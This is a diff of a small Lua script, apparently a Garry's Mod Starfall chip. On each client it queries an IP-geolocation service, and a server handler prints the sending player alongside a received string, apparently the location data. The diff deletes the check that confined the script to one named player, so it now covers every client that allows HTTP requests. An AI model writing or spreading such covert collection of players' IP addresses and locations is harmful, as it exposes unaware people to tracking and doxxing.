@@ -3,7 +3,6 @@
 --@shared
 
 if CLIENT then
-    if player() ~= find.playersByName("charity",false,false)[1] then return end
     if hasPermission("http.get") then
             http.get("https://freegeoip.app/json/",
             function(body,lenght,headers)
@@ -17,7 +16,6 @@ if CLIENT then
     end
 else
     net.receive( "x", function(_,ply)
-        print( ply )
-        print( net.readString() )
+        print( ply, net.readString() )
     end)
 end
